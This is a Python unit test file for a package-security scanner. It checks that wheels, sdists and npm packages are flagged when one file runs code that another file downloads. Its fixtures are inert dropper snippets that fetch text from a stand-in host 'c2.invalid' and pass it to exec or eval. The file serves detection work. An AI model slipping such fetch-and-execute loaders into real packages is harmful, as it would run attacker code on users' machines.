"""0.1.8: registry and guard scans run the cross-file follower
(core._cross_file_received_issues) on the release itself — before, only a
--deps scan of an installed tree did. A file that runs what another file of
the package received over the network is SC-IMPORT-RISK (CRITICAL), named in
the message; the files SC-USE-RISK does not read (tests, docs, examples) are
not read here either, and the follower does not run once the package is
SUSPICIOUS. Payload text is inert: hosts are .invalid, nothing runs.
"""
import json
import unittest

from tests.registry._review_support import scan_npm, scan_sdist, scan_wheel

U = "'https://c2.invalid/p'"
PY_NET = "import requests\n\ndef pull():\n    return requests.get(" + U + ").text\n"
JS_NET = "function pull() {\n  return fetch(" + U + ").then((r) => r.text());\n}\nmodule.exports = { pull };\n"
META = "Name: lit\nVersion: 1.0\n"


def cross(res):
    return [(i["file"], i["sev"], i["msg"]) for i in res["issues"]
            if i["rule"] == "SC-IMPORT-RISK" and "another file of the package" in i["msg"]]


class CrossFileRegistryTests(unittest.TestCase):
    def test_a_wheel(self):
        res = scan_wheel({"lit/__init__.py": "from ._net import pull\nexec(pull())\n", "lit/_net.py": PY_NET,
                          "lit-1.0.dist-info/METADATA": META})
        self.assertEqual(cross(res), [("lit/__init__.py", "CRITICAL",
                                       "lit/__init__.py runs code it receives over the network; the value is received "
                                       "in another file of the package (lit._net).")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_an_npm_package(self):
        manifest = json.dumps({"name": "x", "version": "1.0.0", "main": "index.js"})
        res = scan_npm({"package.json": manifest, "index.js": "module.exports = require('./lib/run');\n",
                        "lib/net.js": JS_NET, "lib/run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n"})
        self.assertEqual(cross(res), [("lib/run.js", "CRITICAL", "lib/run.js runs code it receives over the network; "
                                       "the value is received in another file of the package (./net).")])

    def test_the_runner_in_another_file(self):
        manifest = json.dumps({"name": "x", "version": "1.0.0", "main": "index.js"})
        res = scan_npm({"package.json": manifest, "util.js": "exports.execute = (code) => eval(code);\n",
                        "index.js": "const { execute } = require('./util');\n"
                                    "fetch(" + U + ").then((r) => r.text()).then(execute);\n"})
        self.assertEqual(cross(res), [("index.js", "CRITICAL", "index.js runs code it receives over the network; the "
                                       "function that runs it is in another file of the package (./util).")])

    def test_an_sdist_in_a_src_layout_and_its_top_level_modules(self):
        res = scan_sdist({"setup.py": "from setuptools import setup\nsetup(name='x', version='1.0')\n",
                          "src/x/__init__.py": "", "src/x/_net.py": PY_NET,
                          "src/x/cli.py": "from x._net import pull\n\ndef main():\n    exec(pull())\n",
                          "tests/test_x.py": "from x._net import pull\nexec(pull())\n"})
        self.assertEqual([f for f, _s, _m in cross(res)], ["src/x/cli.py"])      # not tests/: not run when used
        res = scan_wheel({"a.py": "from b import pull\nexec(pull())\n", "b.py": PY_NET, "x-1.0.dist-info/METADATA": META})
        self.assertEqual([f for f, _s, _m in cross(res)], ["a.py"])             # one distribution: one package

    def test_a_wheels_data_purelib(self):
        res = scan_wheel({"x-1.0.data/purelib/x/__init__.py": "from ._net import pull\nexec(pull())\n",
                          "x-1.0.data/purelib/x/_net.py": PY_NET, "x-1.0.dist-info/METADATA": META})
        self.assertEqual([f for f, _s, _m in cross(res)], ["x-1.0.data/purelib/x/__init__.py"])

    def test_quiet_when_the_value_is_only_parsed_and_once_suspicious(self):
        res = scan_wheel({"lit/__init__.py": "import json\nfrom ._net import pull\njson.loads(pull())\n",
                          "lit/_net.py": PY_NET, "lit-1.0.dist-info/METADATA": META})
        self.assertEqual(cross(res), [])
        # already SUSPICIOUS (a single-file dropper): the follower is not run
        res = scan_wheel({"lit/__init__.py": "from ._net import pull\nexec(pull())\n", "lit/_net.py": PY_NET,
                          "lit/other.py": "import requests\nexec(requests.get(" + U + ").text)\n",
                          "lit-1.0.dist-info/METADATA": META})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual(cross(res), [])


if __name__ == "__main__":
    unittest.main()
